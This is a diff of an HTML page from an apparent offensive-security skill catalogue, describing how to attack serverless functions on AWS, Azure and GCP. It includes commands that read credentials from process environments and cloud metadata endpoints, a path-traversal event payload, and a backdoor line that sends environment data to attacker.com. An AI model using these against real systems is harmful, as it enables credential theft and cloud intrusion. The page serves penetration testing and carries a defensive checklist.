@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,11 +47,12 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Attack serverless compute — AWS Lambda, Azure Functions, GCP Cloud Functions, and edge runtimes like Cloudflare Workers. Enumerate functions, inject through event sources (S3, SQS, SNS, API Gateway, EventBridge), extract credentials from the execution environment, abuse over-privileged IAM roles, exploit cold-start persistence and container reuse, and test trigger misconfigurations. Use when a target runs serverless functions, when API Gateway or function URLs front compute, when event-driven architectures process untrusted input, or when cloud function execution roles need privilege-escalation testing.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>Serverless changes the attack surface from hosts to events. There is no SSH, no persistent shell, no OS to enumerate in the traditional sense. The execution environment is ephemeral, but the IAM role attached to it is not, and that role is almost always the real target. A compromised Lambda function does not give you a server — it gives you a set of AWS credentials that refresh automatically, have no MFA, and were scoped by a developer who optimized for "make it work" rather than least privilege. The same pattern holds across Azure Functions, GCP Cloud Functions, and edge runtimes, with minor variation in where the credentials live and how the isolation boundary is drawn.</p>
-<h2>When to Use</h2>
+<div class="wrap slayout"><article><p>Serverless changes the attack surface from hosts to events. There is no SSH, no persistent shell, no OS to enumerate in the traditional sense. The execution environment is ephemeral, but the IAM role attached to it is not, and that role is almost always the real target. A compromised Lambda function does not give you a server — it gives you a set of AWS credentials that refresh automatically, have no MFA, and were scoped by a developer who optimized for "make it work" rather than least privilege. The same pattern holds across Azure Functions, GCP Cloud Functions, and edge runtimes, with minor variation in where the credentials live and how the isolation boundary is drawn.</p>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>The target runs AWS Lambda, Azure Functions, GCP Cloud Functions, or</li>
 </ul>
@@ -58,7 +70,7 @@
 <ul>
 <li>Function URLs or HTTP triggers are exposed without an authorizer</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>IAM-only without serverless compute</strong> — use <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a> for</li>
 </ul>
@@ -71,9 +83,21 @@
 <li><strong>Source code review of function code</strong> without runtime access — use</li>
 </ul>
 <p><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> for static analysis</p>
-<h2>Reconnaissance</h2>
+<h2 id="reconnaissance">Reconnaissance</h2>
 <p>Discover functions before you attack them. The function name, runtime, handler, event sources, and attached role are all enumerable from the cloud control plane or from the application itself.</p>
-<pre><code># AWS — list functions and their configurations
+<div class="codeblk cx"><button class="copy" data-copy="# AWS — list functions and their configurations
+aws lambda list-functions --query &#x27;Functions[*].[FunctionName,Runtime,Role,Handler]&#x27; --output table
+aws lambda list-event-source-mappings --function-name TARGET_FUNCTION
+aws apigateway get-rest-apis
+aws apigatewayv2 get-apis
+
+# Azure
+az functionapp list --query &#x27;[].{name:name, runtime:siteConfig.linuxFxVersion, rg:resourceGroup}&#x27; -o table
+az functionapp function list --name APP_NAME --resource-group RG
+
+# GCP
+gcloud functions list --format=&#x27;table(name,runtime,entryPoint,trigger)&#x27;
+gcloud functions describe FUNCTION_NAME">copy</button><pre><code># AWS — list functions and their configurations
 aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role,Handler]' --output table
 aws lambda list-event-source-mappings --function-name TARGET_FUNCTION
 aws apigateway get-rest-apis
@@ -85,9 +109,9 @@ az functionapp function list --name APP_NAME --resource-group RG
 
 # GCP
 gcloud functions list --format='table(name,runtime,entryPoint,trigger)'
-gcloud functions describe FUNCTION_NAME</code></pre>
+gcloud functions describe FUNCTION_NAME</code></pre></div>
 <p>From the outside, look for: API Gateway default stages (<code>/prod</code>, <code>/dev</code>, <code>/stage</code>), function URL patterns (<code>*.lambda-url.*.on.aws</code>, <code>*.azurewebsites.net/api/</code>, <code>*.cloudfunctions.net</code>), and error responses that leak runtime information (<code>Runtime.HandlerNotFound</code>, <code>MODULE_NOT_FOUND</code>).</p>
-<h2>Event Injection</h2>
+<h2 id="event-injection">Event Injection</h2>
 <p>In serverless, the event IS the input. Every event source is an entry point, and most of them are not HTTP — they bypass WAFs, API gateways, and any middleware that only inspects HTTP requests.</p>
 <p><strong>The event object is attacker-controlled when:</strong></p>
 <ul>
@@ -98,7 +122,15 @@ gcloud functions describe FUNCTION_NAME</code></pre>
 <li>DynamoDB Streams carry records you inserted through the application</li>
 <li>Cloudflare Workers receive the full Request object including headers and URL</li>
 </ul>
-<pre><code># S3 event — the key is attacker-controlled if uploads are open
+<div class="codeblk cx"><button class="copy" data-copy="# S3 event — the key is attacker-controlled if uploads are open
+{
+  &quot;Records&quot;: [{
+    &quot;s3&quot;: {
+      &quot;bucket&quot;: {&quot;name&quot;: &quot;target-bucket&quot;},
+      &quot;object&quot;: {&quot;key&quot;: &quot;../../../tmp/payload&quot;}
+    }
+  }]
+}">copy</button><pre><code># S3 event — the key is attacker-controlled if uploads are open
 {
   "Records": [{
     "s3": {
@@ -106,17 +138,43 @@ gcloud functions describe FUNCTION_NAME</code></pre>
       "object": {"key": "../../../tmp/payload"}
     }
   }]
-}</code></pre>
-<pre><code># Inject through SQS — if you have SendMessage permission
+}</code></pre></div>
+<div class="codeblk cx"><button class="copy" data-copy="# Inject through SQS — if you have SendMessage permission
+aws sqs send-message --queue-url https://sqs.*.amazonaws.com/ACCOUNT/QUEUE \
+  --message-body &#x27;{&quot;exploit&quot;: &quot;payload&quot;}&#x27;
+
+# Invoke a function directly if you have lambda:InvokeFunction
+aws lambda invoke --function-name TARGET --payload &#x27;{&quot;key&quot;:&quot;value&quot;}&#x27; /dev/stdout">copy</button><pre><code># Inject through SQS — if you have SendMessage permission
 aws sqs send-message --queue-url https://sqs.*.amazonaws.com/ACCOUNT/QUEUE \
   --message-body '{"exploit": "payload"}'
 
 # Invoke a function directly if you have lambda:InvokeFunction
-aws lambda invoke --function-name TARGET --payload '{"key":"value"}' /dev/stdout</code></pre>
+aws lambda invoke --function-name TARGET --payload '{"key":"value"}' /dev/stdout</code></pre></div>
 <p>Test each event source independently. A function that sanitizes HTTP input from API Gateway may not sanitize the same fields when they arrive from SQS.</p>
-<h2>Environment Variable Extraction</h2>
+<h2 id="environment-variable-extraction">Environment Variable Extraction</h2>
 <p>Serverless runtimes inject credentials and configuration as environment variables. If you achieve code execution inside a function, these are the first targets.</p>
-<pre><code># Read the process environment — works in most runtimes
+<div class="codeblk cx"><button class="copy" data-copy="# Read the process environment — works in most runtimes
+cat /proc/self/environ | tr &#x27;\0&#x27; &#x27;\n&#x27;
+
+# Key variables on AWS Lambda
+echo $AWS_ACCESS_KEY_ID
+echo $AWS_SECRET_ACCESS_KEY
+echo $AWS_SESSION_TOKEN
+echo $AWS_LAMBDA_FUNCTION_NAME
+echo $AWS_REGION
+
+# Lambda runtime API — metadata endpoint inside the execution environment
+curl -s &quot;http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next&quot;
+
+# Azure Functions
+echo $AzureWebJobsStorage          # often a full connection string
+echo $IDENTITY_ENDPOINT            # managed identity token endpoint
+curl -s &quot;$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2019-08-01&quot; \
+  -H &quot;X-IDENTITY-HEADER: $IDENTITY_HEADER&quot;
+
+# GCP Cloud Functions — metadata server
+curl -s &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&quot; \
+  -H &quot;Metadata-Flavor: Google&quot;">copy</button><pre><code># Read the process environment — works in most runtimes
 cat /proc/self/environ | tr '\0' '\n'
 
 # Key variables on AWS Lambda
@@ -137,11 +195,11 @@ curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-versi
 
 # GCP Cloud Functions — metadata server
 curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-  -H "Metadata-Flavor: Google"</code></pre>
+  -H "Metadata-Flavor: Google"</code></pre></div>
 <p>Developers also store secrets in environment variables directly rather than using Secrets Manager or Key Vault. Look for database connection strings, API keys, and third-party credentials.</p>
-<h2>IAM Role Abuse</h2>
+<h2 id="iam-role-abuse">IAM Role Abuse</h2>
 <p>The function's execution role is the pivot point. It is almost always over-privileged because developers add permissions until the function works and never remove them.</p>
-<pre><code># Identify who you are
+<div class="codeblk cx"><button class="copy" data-copy="# Identify who you are
 aws sts get-caller-identity
 
 # Enumerate what you can do — use the stolen credentials outside Lambda
@@ -159,7 +217,25 @@ aws s3 ls                                     # s3:ListAllMyBuckets
 aws secretsmanager list-secrets               # secretsmanager:ListSecrets
 aws dynamodb list-tables                      # dynamodb:ListTables
 aws lambda list-functions                     # lambda:ListFunctions
-aws iam list-roles                            # iam:ListRoles</code></pre>
+aws iam list-roles                            # iam:ListRoles">copy</button><pre><code># Identify who you are
+aws sts get-caller-identity
+
+# Enumerate what you can do — use the stolen credentials outside Lambda
+# (session tokens from Lambda are valid for up to 12 hours)
+export AWS_ACCESS_KEY_ID=...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+
+# Enumerate policies attached to the role
+aws iam list-attached-role-policies --role-name ROLE_NAME
+aws iam get-role-policy --role-name ROLE_NAME --policy-name POLICY
+
+# Common over-privileges to check for
+aws s3 ls                                     # s3:ListAllMyBuckets
+aws secretsmanager list-secrets               # secretsmanager:ListSecrets
+aws dynamodb list-tables                      # dynamodb:ListTables
+aws lambda list-functions                     # lambda:ListFunctions
+aws iam list-roles                            # iam:ListRoles</code></pre></div>
 <p><strong>Escalation paths from a Lambda role:</strong></p>
 <ul>
 <li><code>iam:PassRole</code> + <code>lambda:CreateFunction</code> + <code>lambda:InvokeFunction</code> — create</li>
@@ -173,20 +249,27 @@ aws iam list-roles                            # iam:ListRoles</code></pre>
 <li><code>secretsmanager:GetSecretValue</code> — read secrets from Secrets Manager</li>
 </ul>
 <p>On Azure, a managed identity with Contributor on the subscription is the equivalent finding. On GCP, check for <code>iam.serviceAccountTokenCreator</code> or <code>owner</code> roles on the function's service account.</p>
-<h2>Cold Start and Runtime Persistence</h2>
+<h2 id="cold-start-and-runtime-persistence">Cold Start and Runtime Persistence</h2>
 <p>The execution environment persists between invocations for minutes to hours. Anything written to <code>/tmp</code> survives across calls to the same warm container.</p>
-<pre><code># Check for artifacts from previous invocations
+<div class="codeblk cx"><button class="copy" data-copy="# Check for artifacts from previous invocations
 ls -la /tmp/
 cat /tmp/*.log 2&gt;/dev/null
 
 # Write a persistent payload — it will execute on the next invocation
-echo 'import os; os.system("curl attacker.com/exfil?data=$(env|base64)")' &gt; /tmp/backdoor.py</code></pre>
+echo &#x27;import os; os.system(&quot;curl attacker.com/exfil?data=$(env|base64)&quot;)&#x27; &gt; /tmp/backdoor.py">copy</button><pre><code># Check for artifacts from previous invocations
+ls -la /tmp/
+cat /tmp/*.log 2&gt;/dev/null
+
+# Write a persistent payload — it will execute on the next invocation
+echo 'import os; os.system("curl attacker.com/exfil?data=$(env|base64)")' &gt; /tmp/backdoor.py</code></pre></div>
 <p><strong>Lambda Layers</strong> are extracted to <code>/opt</code> and shared across functions. A compromised layer poisons every function that uses it. Check:</p>
-<pre><code>aws lambda list-layers
+<div class="codeblk cx"><button class="copy" data-copy="aws lambda list-layers
 aws lambda get-layer-version --layer-name NAME --version-number 1
-# Download, inspect, and look for writable paths or injected dependencies</code></pre>
+# Download, inspect, and look for writable paths or injected dependencies">copy</button><pre><code>aws lambda list-layers
+aws lambda get-layer-version --layer-name NAME --version-number 1
+# Download, inspect, and look for writable paths or injected dependencies</code></pre></div>
 <p><strong>Container reuse</strong> means: file-system state persists in <code>/tmp</code>, global variables in the runtime persist, database connection pools persist, and any background threads you start keep running. On Cloudflare Workers (V8 isolates), global scope persists within the isolate but <code>/tmp</code> does not exist.</p>
-<h2>Shared Tenancy and Isolation Boundaries</h2>
+<h2 id="shared-tenancy-and-isolation-boundaries">Shared Tenancy and Isolation Boundaries</h2>
 <p>Understand the isolation model before assuming escape is possible or impossible.</p>
 <ul>
 <li><strong>AWS Lambda</strong> runs each function in a Firecracker microVM. Cross-function</li>
@@ -205,9 +288,21 @@ aws lambda get-layer-version --layer-name NAME --version-number 1
 </ul>
 <p>surface.</p>
 <p>For most engagements, focus on the IAM role and the application logic rather than the runtime isolation. Sandbox escape is a research target, not a pentest finding.</p>
-<h2>Trigger Misconfiguration</h2>
+<h2 id="trigger-misconfiguration">Trigger Misconfiguration</h2>
 <p>The most common serverless vulnerability is not in the code — it is in how the function is exposed.</p>
-<pre><code># Public API Gateway with no authorizer
+<div class="codeblk cx"><button class="copy" data-copy="# Public API Gateway with no authorizer
+aws apigateway get-resources --rest-api-id API_ID
+aws apigateway get-method --rest-api-id API_ID --resource-id RES_ID --http-method GET
+# Check: authorizationType should not be &quot;NONE&quot; on sensitive endpoints
+
+# Lambda function URLs — public by default if auth-type is NONE
+aws lambda list-function-url-configs --function-name FUNC
+aws lambda get-function-url-config --function-name FUNC
+# Check: AuthType should be AWS_IAM, not NONE
+
+# Azure — function-level authorization keys
+az functionapp function keys list --name APP --function-name FUNC --resource-group RG
+# Check: authLevel should not be &quot;anonymous&quot; on sensitive functions">copy</button><pre><code># Public API Gateway with no authorizer
 aws apigateway get-resources --rest-api-id API_ID
 aws apigateway get-method --rest-api-id API_ID --resource-id RES_ID --http-method GET
 # Check: authorizationType should not be "NONE" on sensitive endpoints
@@ -219,7 +314,7 @@ aws lambda get-function-url-config --function-name FUNC
 
 # Azure — function-level authorization keys
 az functionapp function keys list --name APP --function-name FUNC --resource-group RG
-# Check: authLevel should not be "anonymous" on sensitive functions</code></pre>
+# Check: authLevel should not be "anonymous" on sensitive functions</code></pre></div>
 <p><strong>Common misconfigurations:</strong></p>
 <ul>
 <li>API Gateway deployed without an authorizer (Lambda authorizer, Cognito, IAM)</li>
@@ -232,16 +327,23 @@ az functionapp function keys list --name APP --function-name FUNC --resource-gro
 <ul>
 <li>SNS topics with open subscription policies allowing external subscribers</li>
 </ul>
-<h2>Step Functions and Workflow Manipulation</h2>
+<h2 id="step-functions-and-workflow-manipulation">Step Functions and Workflow Manipulation</h2>
 <p>Orchestration services (AWS Step Functions, Azure Durable Functions, GCP Workflows) introduce state machine logic that is often testable.</p>
-<pre><code># List and describe state machines
+<div class="codeblk cx"><button class="copy" data-copy="# List and describe state machines
 aws stepfunctions list-state-machines
 aws stepfunctions describe-state-machine --state-machine-arn ARN
 
 # List executions and inspect input/output
 aws stepfunctions list-executions --state-machine-arn ARN --status-filter RUNNING
 aws stepfunctions describe-execution --execution-arn EXEC_ARN
-aws stepfunctions get-execution-history --execution-arn EXEC_ARN</code></pre>
+aws stepfunctions get-execution-history --execution-arn EXEC_ARN">copy</button><pre><code># List and describe state machines
+aws stepfunctions list-state-machines
+aws stepfunctions describe-state-machine --state-machine-arn ARN
+
+# List executions and inspect input/output
+aws stepfunctions list-executions --state-machine-arn ARN --status-filter RUNNING
+aws stepfunctions describe-execution --execution-arn EXEC_ARN
+aws stepfunctions get-execution-history --execution-arn EXEC_ARN</code></pre></div>
 <p><strong>Attack patterns:</strong></p>
 <ul>
 <li><strong>Input manipulation</strong> — start an execution with crafted input that skips</li>
@@ -263,7 +365,7 @@ aws stepfunctions get-execution-history --execution-arn EXEC_ARN</code></pre>
 <li><strong>Parallel state abuse</strong> — race conditions in parallel branches that share</li>
 </ul>
 <p>mutable state (DynamoDB, S3)</p>
-<h2>Defensive Review Checklist</h2>
+<h2 id="defensive-review-checklist">Defensive Review Checklist</h2>
 <p>When reviewing a serverless deployment, verify each item:</p>
 <ul>
 <li>[ ] Every function uses a dedicated IAM role scoped to its actual needs</li>
@@ -291,7 +393,7 @@ aws stepfunctions get-execution-history --execution-arn EXEC_ARN</code></pre>
 <li>[ ] VPC-attached functions use security groups and NACLs to restrict egress</li>
 <li>[ ] CORS on API Gateway is restricted to specific origins, not <code>*</code></li>
 </ul>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"The function is ephemeral, so persistence is impossible."</em> <code>/tmp</code> and</li>
 </ul>
@@ -320,14 +422,14 @@ aws stepfunctions get-execution-history --execution-arn EXEC_ARN</code></pre>
 <li><em>"The function has no network access — it is not in a VPC."</em> A function</li>
 </ul>
 <p>outside a VPC has unrestricted internet egress by default. It can reach any AWS API endpoint with its role credentials.</p>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Execution</strong> (TA0002)</p>
 <ul>
 <li><a href="https://attack.mitre.org/techniques/T1648/">T1648</a> Serverless Execution</li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a> — general cloud IAM, control plane, and</li>
 </ul>
@@ -336,5 +438,8 @@ aws stepfunctions get-execution-history --execution-arn EXEC_ARN</code></pre>
 <li><a class="xref" href="testing-apis.html"><code>testing-apis</code></a> — API Gateway and HTTP endpoint testing methodology</li>
 <li><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> — static review of function handler code</li>
 <li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> — detection engineering for serverless abuse patterns</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#reconnaissance">Reconnaissance</a><a href="#event-injection">Event Injection</a><a href="#environment-variable-extraction">Environment Variable Extraction</a><a href="#iam-role-abuse">IAM Role Abuse</a><a href="#cold-start-and-runtime-persistence">Cold Start and Runtime Persistence</a><a href="#shared-tenancy-and-isolation-boundaries">Shared Tenancy and Isolation Boundaries</a><a href="#trigger-misconfiguration">Trigger Misconfiguration</a><a href="#step-functions-and-workflow-manipulation">Step Functions and Workflow Manipulation</a><a href="#defensive-review-checklist">Defensive Review Checklist</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
